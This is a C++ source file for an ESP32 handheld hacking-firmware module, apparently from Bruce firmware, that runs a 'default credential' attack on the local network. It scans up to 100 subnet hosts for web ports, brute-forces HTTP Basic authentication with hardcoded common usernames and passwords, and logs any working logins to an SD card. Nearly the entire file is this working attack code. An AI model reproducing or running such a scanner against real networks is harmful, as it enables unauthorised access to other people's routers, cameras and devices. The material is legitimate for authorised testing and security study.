#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <WiFi.h>
#include <globals.h>

static const char *COMMON_USERS[] = {"admin", "root", "user", "test", "guest", "support"};
static const char *COMMON_PASSWORDS[] = {"admin", "password", "1234", "root", "guest", "test", "support", ""};
static const int NUM_USERS = sizeof(COMMON_USERS) / sizeof(COMMON_USERS[0]);
static const int NUM_PASSWORDS = sizeof(COMMON_PASSWORDS) / sizeof(COMMON_PASSWORDS[0]);

static int scanned = 0;
static int found = 0;

static const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static String base64Encode(const String &input) {
    String out = "";
    int i = 0;
    int len = input.length();
    unsigned char a3[3];
    unsigned char a4[4];
    int j = 0;
    while (len--) {
        a3[j++] = input[i++];
        if (j == 3) {
            a4[0] = (a3[0] & 0xfc) >> 2;
            a4[1] = ((a3[0] & 0x03) << 4) | ((a3[1] & 0xf0) >> 4);
            a4[2] = ((a3[1] & 0x0f) << 2) | ((a3[2] & 0xc0) >> 6);
            a4[3] = a3[2] & 0x3f;
            for (j = 0; j < 4; j++) out += b64chars[a4[j]];
            j = 0;
        }
    }
    if (j) {
        for (int k = j; k < 3; k++) a3[k] = 0;
        a4[0] = (a3[0] & 0xfc) >> 2;
        a4[1] = ((a3[0] & 0x03) << 4) | ((a3[1] & 0xf0) >> 4);
        a4[2] = ((a3[1] & 0x0f) << 2) | ((a3[2] & 0xc0) >> 6);
        for (int k = 0; k < j + 1; k++) out += b64chars[a4[k]];
        while (j++ < 3) out += '=';
    }
    return out;
}

void arsenal_default_cred_scanner(void) {
    ARSENAL_HEAP_CHECK();
    if (WiFi.getMode() != WIFI_STA || WiFi.status() != WL_CONNECTED) {
        displayRedStripe("WiFi not connected");
        delay(1500);
        return;
    }

    scanned = 0;
    found = 0;

    drawMainBorderWithTitle("Def Cred Scan");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setCursor(12, 50);
    tft.print("Scanning network...");
    delay(500);

    IPAddress gateway = WiFi.gatewayIP();
    uint32_t gw = (uint32_t)gateway;
    uint32_t mask = (uint32_t)WiFi.subnetMask();
    uint32_t network = gw & mask;
    uint32_t total = (network | ~mask) - network - 1;
    if (total > 100) total = 100;

    File logFile;
    if (setupSdCard()) {
        if (!SD.exists("/arsenal")) SD.mkdir("/arsenal");
        logFile = SD.open("/arsenal/creds.txt", FILE_APPEND);
    }

    for (uint32_t i = 1; i <= total; i++) {
        if (check(EscPress)) break;

        IPAddress target((network + i) & 0xFF, ((network + i) >> 8) & 0xFF,
                         ((network + i) >> 16) & 0xFF, ((network + i) >> 24) & 0xFF);

        WiFiClient client;
        client.setTimeout(100);
        bool httpOpen = client.connect(target, 80, 100);
        if (!httpOpen) httpOpen = client.connect(target, 443, 100);
        if (!httpOpen) httpOpen = client.connect(target, 8080, 100);

        if (httpOpen) {
            scanned++;
            for (int u = 0; u < NUM_USERS && !check(EscPress); u++) {
                for (int p = 0; p < NUM_PASSWORDS && !check(EscPress); p++) {
                    client.stop();
                    delay(50);
                    if (!client.connect(target, 80, 100)) continue;

                    String auth = base64Encode(String(COMMON_USERS[u]) + ":" + String(COMMON_PASSWORDS[p]));
                    String req = "GET / HTTP/1.1\r\nHost: " + target.toString() + "\r\nAuthorization: Basic " + auth + "\r\n\r\n";
                    client.print(req);
                    delay(100);

                    String resp = client.readStringUntil('\n');
                    if (resp.indexOf("200") >= 0 || resp.indexOf("302") >= 0) {
                        found++;
                        String log = target.toString() + " | " + COMMON_USERS[u] + ":" + COMMON_PASSWORDS[p];
                        if (logFile) {
                            logFile.println(log);
                            logFile.flush();
                        }
                        drawMainBorderWithTitle("Def Cred Scan");
                        tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
                        tft.setTextSize(FP);
                        tft.setCursor(12, 60);
                        tft.printf("HIT: %s", target.toString().c_str());
                        tft.setCursor(12, 76);
                        tft.printf("%s:%s", COMMON_USERS[u], COMMON_PASSWORDS[p]);
                        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
                        tft.drawCentreString("Esc:stop", tftWidth / 2, tftHeight - 20, 1);
                        delay(1000);
                        break;
                    }
                }
            }
            client.stop();
        }

        if (scanned % 5 == 0) {
            drawMainBorderWithTitle("Def Cred Scan");
            int y = 45;
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setTextSize(FP);
            tft.setCursor(12, y);
            tft.printf("Scanning: %s", target.toString().c_str());
            y += 14;
            tft.setCursor(12, y);
            tft.printf("HTTP hosts: %d", scanned);
            y += 14;
            tft.setCursor(12, y);
            tft.printf("Creds found: %d", found);
            y += 14;
            tft.setCursor(12, y);
            tft.printf("Progress: %d/%d", (int)i, (int)total);
            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
            tft.drawCentreString("Esc:stop", tftWidth / 2, tftHeight - 20, 1);
        }
        esp_task_wdt_reset();
    }

    if (logFile) logFile.close();

    drawMainBorderWithTitle("Def Cred Scan");
    tft.setTextColor(found > 0 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setCursor(12, 55);
    tft.printf("Hosts: %d  Creds: %d", scanned, found);
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.drawCentreString("Esc:done", tftWidth / 2, tftHeight - 20, 1);
    while (!check(EscPress)) delay(100);
}
